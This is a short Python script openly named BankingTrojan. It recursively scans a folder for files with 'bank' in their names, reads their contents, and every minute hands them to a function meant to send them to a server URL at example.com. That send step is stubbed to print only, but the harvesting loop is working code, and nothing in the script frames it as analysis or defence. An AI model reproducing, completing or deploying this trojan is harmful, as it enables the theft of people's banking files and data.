import os
import time

class BankingTrojan:
    def __init__(self, target_folder):
        self.target_folder = target_folder

    def collect_data(self):
        data = []
        # Collect files from the specified folder
        for root, dirs, files in os.walk(self.target_folder):
            for file_name in files:
                if 'bank' in file_name.lower():
                    with open(os.path.join(root, file_name), 'r') as f:
                        data.append(f.read())
        return '\n'.join(data)

    def send_data_to_server(self, server_url, data):
        # Simulate sending data to the server
        print(f"Sending: {data[:50]}...")

    def run(self):
        while True:
            try:
                collected_data = self.collect_data()
                if collected_data:
                    self.send_data_to_server('https://example.com/bank', collected_data)
            except Exception as e:
                print(e)

            time.sleep(60)  # Check every minute

trojan = BankingTrojan('/path/to/target/folder')
trojan.run()
